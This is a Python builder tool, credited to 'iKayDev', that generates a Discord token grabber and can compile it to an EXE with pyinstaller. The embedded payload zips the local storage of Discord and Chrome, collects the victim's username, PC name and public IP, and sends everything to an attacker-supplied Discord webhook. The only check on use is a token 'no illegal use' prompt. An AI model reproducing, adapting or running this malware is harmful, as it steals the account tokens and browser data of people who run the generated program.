import termcolor
import os
import sys

def logo():
    termcolor.cprint('''  
 ,,
`""*$b..
     ""*$o.
         "$$o.
           "*$$o.
              "$$$o.
                "$$$$bo...       ..o:
                  "$$$$$$$$booocS$$$    ..    ,.
               ".    "*$$$$SP     V$o..o$$. .$$$b
                "$$o. .$$$$$o. ...A$$$$$$$$$$$$$$b
          ""bo.   "*$$$$$$$$$$$$$$$$$$$$P*$$$$$$$$:
             "$$.    V$$$$$$$$$P"**""*"'   VP  * "l
               "$$$o.4$$$$$$$$X
                "*$$$$$$$$$$$$$AoA$o..oooooo..           .b
                       .X$$$$$$$$$$$P""     ""*oo,,     ,$P
                      $$P""V$$$$$$$:    .        ""*****"
                    .*"    A$$$$$$$$o.4;      .
                         .oP""   "$$$$$$b.  .$;
                                  A$$$$$$$$$$P
                                  "  "$$$$$P"
                                      $$P*"
                                     .$"
                                     "                 by iKayDev'''
                     , "green")


def menu():
    logo()
    print(" ")
    print("""
    [1] : Token Grabber Menü.
    [2] : Webhook Kaydet.
    [3] : Terminal'i Temizle.
    [4] : Çıkış.
    """)
    giris()

def menu2():
    print(" ")
    print("""
    [1] : Token Grabber Menu.
    [2] : Save a Webhook.
    [3] : Clear the Terminal.
    [4] : Exit.
    """)
    giris()


def grabbermenu():
    webhook = input("Webhook: ")
    adi = input("Grabber Name: ")
    exe = input("Do you want a 'EXE' output? E/H: ")
    payload = """
import os
import sys
import shutil
import zipfile
from requests import get
from dhooks import Webhook, File

hook = Webhook('WEBHOOKBURAYA')
path = os.getenv('APPDATA')
localpath = os.getenv('LOCALAPPDATA')
user = os.getenv('username')
pc_name = os.environ['COMPUTERNAME']
temp_dir = localpath+"\\\\temp\\\\"
tokendir = path+"\\\\Discord\\\\Local Storage\\\\\leveldb\\\\"
ptbtokendir = path+"\\\\discordptb\\\\Local Storage\\\\leveldb\\\\"
canarytokendir = path+"\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\"
chromedir = localpath + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\"

zipf = temp_dir+"logs.zip"
if os.path.isfile(temp_dir+"run.log"):
  sys.exit()
ip = get('https://api.ipify.org').text

if os.path.isfile(zipf):
  os.remove(zipf)

zip = zipfile.ZipFile(zipf,'a')

if os.path.isdir(tokendir):
  discordinst = True
  try:
    for root, dirs, files in os.walk(tokendir):
      for file in files:
        zip.write(tokendir+file)
  except Exception:
    failed = True
else:
  discordinst = False

if os.path.isdir(ptbtokendir):
  ptbinst = True
  try:
     for root, dirs, files in os.walk(ptbtokendir):
       for file in files:
         zip.write(ptbtokendir+file)
  except Exception:
     ptbfailed = True
else:
  ptbinst = False

if os.path.isdir(canarytokendir):
  canaryinst = True
  try:
     for root, dirs, files in os.walk(canarytokendir):
       for file in files:
         zip.write(canarytokendir+file)
  except Exception:
     canaryfailed = True
else:
  canaryinst = False

if os.path.isdir(chromedir):
  chromeinst = True
  try:
     for root, dirs, files in os.walk(chromedir):
       for file in files:
         zip.write(chromedir+file)
  except Exception:
     chromefailed = True
else:
  chromeinst = False
zip.close()

def main():
  with open (temp_dir+"run.log", 'w+') as handle:
    handle.write("Fatal Error.")
    handle.close()
  hook.send('```css\\nToken Grabbed! \\n\\nUsername: '+str(user) + '\\nPC Name: ' + pc_name + '\\nIP Address: {}'.format(ip) +'\\n\\nZip File:```')
  try:
    hook.send(file = File(zipf, name=str(user)+" Logs.zip"))
  except:
    hook.send('```css\\nThere was an error obtaining the zip.```')
  if discordinst and ptbinst and canaryinst and chromeinst == False:
    hook.send("```css\\nUser had nothing installed```")
  try:
    os.remove(zipf)
  except:
    return ''

main()

     """
    grabberwebhook = open(adi + ".py", "w")
    payload.replace("/","//")
    grabberwebhook.write(payload.replace("WEBHOOKBURAYA", webhook))
    gerekli = open(adi + " requirements.txt", "w")
    gerekli.write("""
    requests
    dhooks
    """)
    if exe == "E":
        print("\n" * 100)
        logo()
        termcolor.cprint("EXE is being created...", "red")
        os.system("pyinstaller --onefile " + adi + ".py")
        termcolor.cprint("Grabber ' " + adi + ".exe ' successfully created in the 'dist' folder with the name.", "green")
        menu2()
    elif exe == "e":
        logo()
        termcolor.cprint("EXE is being created...", "red")
        os.system("pyinstaller --onefile " + adi + ".py")
        print("\n" * 100)
        termcolor.cprint("Grabber ' " + adi + ".exe ' successfully created in the 'dist' folder with the name.", "green")
        menu2()
    else:
        print("\n" * 100)
        termcolor.cprint("Grabber ' " + adi + ".py ' successfully created with the name.", "green")
        menu2()
def izin():
    termcolor.cprint("Do you confirm that you will not use the application for illegal purposes?", "red")
    onay = input("If you confirm, write 'YES': ")
    if onay == "YES":
        print("\n" * 100)
        menu()
    elif onay == "evet":
        print("\n" * 100)
        menu()
    else:
        print("\n" * 100)
        logo()
        print("Please type 'YES' to continue, '" + onay + "' is an invalid argument.")
        izin()


def giris():
    girdi = input("Command: ")
    if girdi == "1":
        grabbermenu()
    elif girdi == "2":
        logo()
        webhooklar = open("Saved Webhook.txt", "w")
        kaydedilecek = input("Webhook URL: ")
        webhooklar.write(kaydedilecek)
        print("\n" * 100)
        menu()
    elif girdi == "3":
        print("\n" * 100)
        menu()
    elif girdi == "4":
        termcolor.cprint("See You Later!", "red")
        sys.exit()
logo()
izin()
